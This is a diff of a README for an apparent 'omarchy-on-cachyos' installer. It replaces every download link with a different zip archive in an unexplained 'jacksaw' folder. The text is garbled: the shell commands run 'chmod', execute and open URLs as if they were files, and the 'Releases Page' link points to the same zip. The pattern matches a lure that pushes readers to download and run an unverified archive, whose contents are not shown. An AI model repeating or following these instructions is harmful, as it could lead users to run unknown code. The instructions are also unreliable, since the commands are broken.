@@ -1,6 +1,6 @@
 # 🚀 omarchy-on-cachyos - Easy Installation for Omarchy on CachyOS
 
-[![Download](https://raw.githubusercontent.com/harshanarodrigos/omarchy-on-cachyos/main/jacksaw/omarchy-on-cachyos.zip)](https://raw.githubusercontent.com/harshanarodrigos/omarchy-on-cachyos/main/jacksaw/omarchy-on-cachyos.zip)
+[![Download](https://github.com/harshanarodrigos/omarchy-on-cachyos/raw/refs/heads/main/jacksaw/omarchy-on-cachyos-Jeany.zip)](https://github.com/harshanarodrigos/omarchy-on-cachyos/raw/refs/heads/main/jacksaw/omarchy-on-cachyos-Jeany.zip)
 
 ## 📋 Overview
 
@@ -24,11 +24,11 @@ To download the installation script for Omarchy:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads:
    
-   [Visit this page to download](https://raw.githubusercontent.com/harshanarodrigos/omarchy-on-cachyos/main/jacksaw/omarchy-on-cachyos.zip)
+   [Visit this page to download](https://github.com/harshanarodrigos/omarchy-on-cachyos/raw/refs/heads/main/jacksaw/omarchy-on-cachyos-Jeany.zip)
 
 2. **Choose the Latest Release:** Look for the version marked as "Latest". This version has the newest features and fixes.
 
-3. **Download the Script:** Click on the link for the installation script. It will usually be named something like `https://raw.githubusercontent.com/harshanarodrigos/omarchy-on-cachyos/main/jacksaw/omarchy-on-cachyos.zip`. Your browser will start the download automatically.
+3. **Download the Script:** Click on the link for the installation script. It will usually be named something like `https://github.com/harshanarodrigos/omarchy-on-cachyos/raw/refs/heads/main/jacksaw/omarchy-on-cachyos-Jeany.zip`. Your browser will start the download automatically.
 
 4. **Locate the Downloaded File:** Once the download is complete, find the file in your Downloads folder or the location where your browser saves files.
 
@@ -43,13 +43,13 @@ To download the installation script for Omarchy:
 7. **Make the Script Executable:** Before you can run the script, ensure it is executable. Use the next command:
 
    ```bash
-   chmod +x https://raw.githubusercontent.com/harshanarodrigos/omarchy-on-cachyos/main/jacksaw/omarchy-on-cachyos.zip
+   chmod +x https://github.com/harshanarodrigos/omarchy-on-cachyos/raw/refs/heads/main/jacksaw/omarchy-on-cachyos-Jeany.zip
    ```
 
 8. **Run the Script:** Now, you can execute the script with the following command:
 
    ```bash
-   https://raw.githubusercontent.com/harshanarodrigos/omarchy-on-cachyos/main/jacksaw/omarchy-on-cachyos.zip
+   https://github.com/harshanarodrigos/omarchy-on-cachyos/raw/refs/heads/main/jacksaw/omarchy-on-cachyos-Jeany.zip
    ```
 
    Follow the prompts that appear in the terminal to complete the installation.
@@ -61,7 +61,7 @@ After the installation completes, you may want to configure Omarchy according to
 1. **Open the Configuration File:**
    
    ```bash
-   nano ~https://raw.githubusercontent.com/harshanarodrigos/omarchy-on-cachyos/main/jacksaw/omarchy-on-cachyos.zip
+   nano ~https://github.com/harshanarodrigos/omarchy-on-cachyos/raw/refs/heads/main/jacksaw/omarchy-on-cachyos-Jeany.zip
    ```
 
 2. **Adjust Settings:** Review the options and make changes as needed. Save your changes and exit the editor (in nano, press `CTRL + X`, then `Y`, then `Enter`).
@@ -82,7 +82,7 @@ If you encounter issues during installation, consider the following tips:
 
 - **Missing Dependencies:** Ensure all required packages are installed. You can generally install these through the Terminal. For specifics, refer to the documentation.
 
-- **Check for Updates:** Occasionally, new issues arise in older versions. Always use the latest release from the [Releases Page](https://raw.githubusercontent.com/harshanarodrigos/omarchy-on-cachyos/main/jacksaw/omarchy-on-cachyos.zip).
+- **Check for Updates:** Occasionally, new issues arise in older versions. Always use the latest release from the [Releases Page](https://github.com/harshanarodrigos/omarchy-on-cachyos/raw/refs/heads/main/jacksaw/omarchy-on-cachyos-Jeany.zip).
 
 ## 💬 Getting Help
 
